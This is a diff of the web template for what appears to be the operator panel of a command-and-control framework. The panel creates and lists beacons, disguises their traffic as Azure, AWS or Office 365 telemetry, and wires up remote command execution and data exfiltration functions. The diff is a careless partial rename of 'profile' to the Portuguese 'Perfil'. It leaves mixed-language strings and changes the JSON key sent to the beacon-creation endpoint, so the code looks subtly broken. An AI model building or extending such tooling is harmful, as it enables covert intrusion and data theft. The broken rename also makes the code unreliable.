@@ -19,8 +19,8 @@
             </div>
             <div class="card-body">
                 <div class="mb-3">
-                    <label class="form-label">Profile</label>
-                    <select class="form-select bg-secondary text-light" id="profile-select">
+                    <label class="form-label">Perfil</label>
+                    <select class="form-select bg-secondary text-light" id="Perfil-select">
                         <option value="azure">Azure Telemetry</option>
                         <option value="aws">AWS SDK</option>
                         <option value="o365">Office 365</option>
@@ -37,30 +37,30 @@
     <div class="col-md-6">
         <div class="card bg-dark border-secondary">
             <div class="card-header bg-dark border-secondary">
-                <h5 class="mb-0"><i class="fas fa-info-circle text-info"></i> Profile Info</h5>
+                <h5 class="mb-0"><i class="fas fa-info-circle text-info"></i> Perfil Info</h5>
             </div>
             <div class="card-body">
-                <div id="profile-info">
-                    <p class="text-muted">Select a profile to see details</p>
+                <div id="Perfil-info">
+                    <p class="text-muted">Select a Perfil to see details</p>
                 </div>
             </div>
         </div>
     </div>
 </div>
 
-<!-- Active Beacons -->
+<!-- Beacons Ativos -->
 <div class="row">
     <div class="col-md-12">
         <div class="card bg-dark border-secondary">
             <div class="card-header bg-dark border-secondary d-flex justify-content-between">
-                <h5 class="mb-0"><i class="fas fa-list text-info"></i> Active Beacons</h5>
+                <h5 class="mb-0"><i class="fas fa-list text-info"></i> Beacons Ativos</h5>
                 <button class="btn btn-sm btn-outline-secondary" id="refresh-beacons-btn">
                     <i class="fas fa-sync"></i> Refresh
                 </button>
             </div>
             <div class="card-body">
                 <div id="beacons-list">
-                    <div class="alert alert-info">No active beacons. Create one above.</div>
+                    <div class="alert alert-info">No Beacons Ativos. Create one above.</div>
                 </div>
             </div>
         </div>
@@ -97,7 +97,7 @@
 {% endblock %}
 
 {% block extra_js %}
-<script>const PROFILE_INFO = {
+<script>const Perfil_INFO = {
     'azure': {
         'name': 'Azure Telemetry',
         'description': 'Appears as legitimate Azure diagnostic data',
@@ -121,19 +121,19 @@
 };
 
 document.addEventListener('DOMContentLoaded', function() {
-    document.getElementById('profile-select').addEventListener('change', updateProfileInfo);
+    document.getElementById('Perfil-select').addEventListener('change', updatePerfilInfo);
     document.getElementById('create-beacon-btn').addEventListener('click', createBeacon);
     document.getElementById('refresh-beacons-btn').addEventListener('click', loadBeacons);
     document.getElementById('execute-cmd-btn').addEventListener('click', executeCommand);
 
-    updateProfileInfo();
+    updatePerfilInfo();
     loadBeacons();
 });
 
-function updateProfileInfo() {
-    const profile = document.getElementById('profile-select').value;
-    const info = PROFILE_INFO[profile];
-    document.getElementById('profile-info').innerHTML = `
+function updatePerfilInfo() {
+    const Perfil = document.getElementById('Perfil-select').value;
+    const info = Perfil_INFO[Perfil];
+    document.getElementById('Perfil-info').innerHTML = `
         <p><strong>${info.name}</strong></p>
         <p class="text-muted">${info.description}</p>
         <p><small class="text-info">URI: <code>${info.uri}</code></small></p>
@@ -141,11 +141,11 @@ function updateProfileInfo() {
 }
 
 function createBeacon() {
-    const profile = document.getElementById('profile-select').value;
+    const Perfil = document.getElementById('Perfil-select').value;
     fetch(`${API_BASE}/c2/beacon/create`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ profile })
+        body: JSON.stringify({ Perfil })
     })
     .then(r => r.json())
     .then(data => {
@@ -165,7 +165,7 @@ function loadBeacons() {
 function renderBeacons(beacons) {
     const list = document.getElementById('beacons-list');
     if (beacons.length === 0) {
-        list.innerHTML = '<div class="alert alert-info">No active beacons.</div>';
+        list.innerHTML = '<div class="alert alert-info">No Beacons Ativos.</div>';
         return;
     }
 
@@ -220,4 +220,5 @@ function exfiltrateData(beaconId) {
 }
 </script>
 {% endblock %}
+
 
